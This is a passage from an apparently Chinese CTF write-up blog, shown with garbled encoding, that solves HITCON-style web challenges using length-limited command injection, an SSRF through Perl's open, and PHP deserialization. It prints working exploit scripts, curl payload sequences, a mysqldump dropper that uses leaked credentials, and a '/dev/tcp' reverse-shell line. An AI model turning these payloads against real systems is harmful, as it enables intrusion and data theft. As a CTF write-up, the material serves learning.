class="string">&#x27;ls&gt;&gt;_&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&gt;bash&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">cmd=<span class="string">&#x27;curl your_ip:your_port&#x27;</span></span><br><span class="line">target=<span class="string">&#x27;117.50.3.97:8001&#x27;</span></span><br><span class="line">cmd=<span class="built_in">list</span>(cmd)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(cmd)!=<span class="number">0</span>:</span><br><span class="line">    first=cmd.pop()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cmd)!=<span class="number">0</span>:</span><br><span class="line">        second=cmd.pop()</span><br><span class="line">        <span class="keyword">if</span> second <span class="keyword">in</span> [<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>]:</span><br><span class="line">            cmd.append(second)</span><br><span class="line">            <span class="keyword">if</span> first <span class="keyword">in</span> [<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>]:</span><br><span class="line">                payload.append(<span class="string">&#x27;&gt;\\&#x27;</span> + first + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload.append(<span class="string">&#x27;&gt;&#x27;</span> + first + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res=<span class="string">&#x27;&#x27;</span>+second</span><br><span class="line">            <span class="keyword">if</span> first <span class="keyword">in</span> [<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>]:</span><br><span class="line">                res+=<span class="string">&#x27;\\&#x27;</span>+first</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res+=first</span><br><span class="line">            payload.append(<span class="string">&#x27;&gt;&#x27;</span> + res + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> first <span class="keyword">in</span> [<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>]:</span><br><span class="line">            payload.append(<span class="string">&#x27;&gt;\\&#x27;</span> + first + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload.append(<span class="string">&#x27;&gt;&#x27;</span> + first + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload.append(<span class="string">&#x27;sh _&#x27;</span>)</span><br><span class="line">payload.append(<span class="string">&#x27;sh g&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://&#x27;</span> + target + <span class="string">&#x27;/?reset=1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">&#x27;http://&#x27;</span> + target + <span class="string">&#x27;/?cmd=&#x27;</span> + quote(i) )</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿åˆ°shell <img src="/images/2018/08/ichunqiu-5.jpg" alt="blacsheep" /> ç„¶ååœ¨homeä¸‹é¢æ‰¾åˆ°ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flag is in the MySQL database</span><br><span class="line">fl4444g / SugZXUtgeJ52_Bvr</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå†å»è¿æ¥mysqlå°±å¯ä»¥äº† ä¸è¿‡è¿™é‡Œè¿æ¥mysqlæ˜¯ä¸èƒ½ç›´æ¥å’Œmysqlè¿›è¡Œé€šä¿¡çš„,æ‰€ä»¥æˆ‘ä»¬å°†å’Œmysqläº¤äº’çš„ç»“æœå¯¼å‡ºåˆ°æ–‡ä»¶ <img src="/images/2018/08/ichunqiu-4.jpg" alt="blacsheep" /> å³æ‹¿åˆ°flag</p><h4 id="infosecçš„æ–¹æ³•">infosecçš„æ–¹æ³•</h4><p>è¿™ä¸ªæ¯”è¾ƒå‰å®³,ä¸è¿‡åœ¨ichunqiuçš„ç¯å¢ƒå¤ç°ä¸äº†,å› ä¸ºichunqiuçš„webç›®å½•æ˜¯/var/www/html/ä½†æ˜¯/www/sandboxå¹¶æ²¡æœ‰è¿›è¡Œé…ç½®,æ‰€ä»¥æˆ‘ä»¬æ— æ³•è·å–åˆ°æˆ‘ä»¬å¯¼å‡ºçš„æ–‡ä»¶,åªèƒ½å¯¹å…¶è¿›è¡Œæ“ä½œ.ä¸è¿‡æ€è·¯ç¡®å®å¾ˆæ£’,å­¦ä¹ ä¸€ä¸‹ å‡è®¾æˆ‘ä»¬å¯ä»¥è®¿é—®åˆ°æ–‡ä»¶çš„è¯,é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;find&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=*%20/&gt;x&#x27;</span><br></pre></td></tr></table></figure><p>ç„¶åå³å¯æŠŠæ‰€æœ‰çš„æ–‡ä»¶å¯¼å‡ºåˆ°x,ä¸‹è½½xæŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶,å‘ç°ç‰¹æ®Šæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/fl4444g/README.txt</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨tarå‘½ä»¤æ‰“åŒ…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;tar&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;zcf&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;zzz&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=*%20/h*&#x27;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ‰§è¡Œäº†å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zcf zzz /h*</span><br></pre></td></tr></table></figure><p>ä¸‹è½½ä¹‹ååŒæ ·å‘ç°flagåœ¨æ•°æ®åº“,è¿™é‡Œinfosecå¸ˆå‚…çš„æ–¹æ³•å°±å¾ˆå‰å®³äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt;&gt; exploit.php</span><br><span class="line">&lt;?php exec(&#x27;mysqldump --single-transaction -ufl4444g -pSugZXUtgeJ52_Bvr --all-databases &gt; /var/www/html/sandbox/727479ef7cedf30c03459bec7d87b0f0/dump.sql 2&gt;&amp;1&#x27;); ?&gt;</span><br><span class="line">EOF</span><br><span class="line">curl &#x27;http://52.199.204.34/?reset=1&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;tar&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;vcf&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;z&#x27;</span><br><span class="line">curl -F file=@exploit.php -X POST &#x27;http://52.199.204.34/?cmd=%2A%20%2Ft%2A&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=php%20z&#x27;</span><br></pre></td></tr></table></figure><p>å› ä¸ºä¼ æ–‡ä»¶è¿‡å»çš„æ—¶å€™,æ–‡ä»¶ä¼šå­˜åœ¨/tmpç›®å½•ä¸‹ å…ˆåˆ›å»º<code>tar,vcf,z</code> ç„¶åæ‰§è¡Œ<code>* /t*</code> ä¹Ÿå°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar vcf z /t*</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°phpæ–‡ä»¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php z</span><br></pre></td></tr></table></figure><p>å³å¯æ‰§è¡Œå‘½ä»¤ç„¶åå»ä¸‹è½½dump.sqlå³å¯æ‹¿åˆ°flag</p><h3 id="babyfirst-revenge-v2">babyfirst-revenge-v2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯4å­—ç¬¦å‘½ä»¤æ‰§è¡Œ,é‚£ä¹ˆæˆ‘ä»¬çš„<code>ls -t&gt;g</code>çš„æ„é€ å°±è¦å¦æ‰¾åŠæ³•äº†,å®˜æ–¹wpæ˜¯ä½¿ç”¨é€†åº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬ç”¨<code>*</code>ä¹‹åå°±å¯ä»¥å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g&gt;  ht-  sl</span><br></pre></td></tr></table></figure><p>ç„¶ååªç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆxä¸­å°±æ˜¯<code>ls -th&gt;g</code>äº† å…¶ä»–çš„å·®ä¸å¤šäº† è‡ªå·±çš„expå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">&#x27;&gt;dir&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;sl&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;g\&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ht-&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*v&gt;x&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&gt;sh&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ba\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\\\&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;<span class="number">14</span>\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;<span class="number">67</span>\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &quot;&gt;:\\&quot;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cn\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;p.\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;e\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;he\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cs\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;la\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;b\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;\ \\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;rl\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cu\\<span class="string">&#x27;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">target=&#x27;</span><span class="number">117.50</span><span class="number">.3</span><span class="number">.97</span>:<span class="number">8002</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">payload.append(&#x27;</span>sh x<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">payload.append(&#x27;</span>sh g<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r = requests.get(&#x27;</span>http://<span class="string">&#x27; + target + &#x27;</span>/?reset=<span class="number">1</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">for i in payload:</span></span><br><span class="line"><span class="string">    assert len(i) &lt;= 4 </span></span><br><span class="line"><span class="string">    r = requests.get(&#x27;</span>http://<span class="string">&#x27; + target + &#x27;</span>/?cmd=<span class="string">&#x27; + quote(i) )</span></span><br><span class="line"><span class="string">    print i</span></span><br><span class="line"><span class="string">    sleep(0.5)</span></span><br></pre></td></tr></table></figure><p>åŒæ ·æ‹¿åˆ°shell,åŒæ ·çš„æ–¹æ³•æ‹¿åˆ°flag</p><h3 id="ssrfme">ssrfme</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]); </span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>); </span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>])); </span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]); </span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>])); </span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>); </span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>); </span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>); </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ª<code>GET</code>å‘½ä»¤,ä½¿ç”¨äº†ä¸€ä¸‹,å‘ç°æ˜¯å‘é€è¯·æ±‚çš„å‘½ä»¤,é‚£ä¹ˆæ˜¾ç„¶å­˜åœ¨ä¸€ä¸ªssrf. è¿›ä¸€æ­¥åˆ†æ,å‘ç°å¯ä»¥åœ¨sandboxä¸­å†™å…¥ä»»æ„æ–‡ä»¶,ä½†æ˜¯æ€ç´¢ä¸€ç•ªè¿˜æ˜¯æ‰¾ä¸åˆ°getshellçš„æ–¹æ³• çœ‹äº†wpä¹‹å,å‘ç°æ˜¯GETè¿™ä¸ªå‘½ä»¤çš„é—®é¢˜ <img src="/images/2018/08/ichunqiu-6.jpg" alt="blacsheep" /> è¿½æ ¹æº¯æº,å‘ç°å…¶å®æ˜¯perlçš„opençš„ä»»æ„å‘½ä»¤æ‰§è¡Œçš„é—®é¢˜ ä¸¾ä¸ªä¾‹å­ <img src="/images/2018/08/ichunqiu-7.jpg" alt="blacsheep" /> è€ŒGETä¸­æœ‰è°ƒç”¨åˆ°openå‡½æ•°,ä¹Ÿå°±å¯¼è‡´äº†å‘½ä»¤æ‰§è¡Œ ä¸è¿‡è¦æ³¨æ„,ssrfè¯·æ±‚æ–‡ä»¶çš„æ—¶å€™æ–‡ä»¶å¿…é¡»å­˜åœ¨,ä¸è¿‡è¿™é‡Œå¾ˆå¥½è§£å†³,å› ä¸ºå¯ä»¥åˆ›å»ºä»»æ„æ–‡ä»¶ æœ€ç»ˆpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://117.50.3.97:8004/?url=your_ip:port&amp;filename=abc&#x27;</span><br><span class="line">curl &#x27;http://117.50.3.97:8004/?url=&amp;filename=bash%20abc&#x27;</span><br><span class="line">curl &#x27;http://117.50.3.97:8004/?url=file:bash%20abc&amp;filename=xxx&#x27;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœåŠ¡å™¨ä¸Šé¢æ”¾æ”¾åå¼¹shellçš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/your_vps/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>ç„¶åncæ”¶åˆ°shell,æ ¹ç›®å½•æ‰¾åˆ°flag <img src="/images/2018/08/ichunqiu-8.jpg" alt="blacsheep" /></p><h3 id="babyh-master-php-2017">baby^h-master-php-2017</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$FLAG</span>    = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>);</span><br><span class="line">    <span class="variable">$SECRET</span>  = `/read_secret`;</span><br><span class="line">    <span class="variable">$SANDBOX</span> = <span class="string">&quot;/var/www/data/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]); </span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$SANDBOX</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$SANDBOX</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$SANDBOX</span>));</span><br><span class="line">        <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;session-data&quot;</span>, <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s-----%s&quot;</span>, <span class="variable">$data</span>, <span class="variable">$hmac</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$avatar</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;avatar = <span class="variable">$path</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$random</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="number">32</span>));</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;function my_function_<span class="subst">$random</span>() &#123;&quot;</span></span><br><span class="line">                .<span class="string">&quot;  global \$FLAG; \$FLAG();&quot;</span></span><br><span class="line">                .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            <span class="variable">$_GET</span>[<span class="string">&quot;lucky&quot;</span>]();</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$SECRET</span>;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>];</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;-----&quot;</span>, <span class="variable">$data</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>)  !<span class="title function_ invoke__">is_string</span>(<span class="variable">$data</span>)  !<span class="title function_ invoke__">is_string</span>(<span class="variable">$hmac</span>))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="title function_ invoke__">hash_equals</span>(<span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>), <span class="variable">$hmac</span>) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye&quot;</span>);</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;avatar) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>-&gt;avatar;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>] . <span class="string">&quot;/avatar.gif&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ 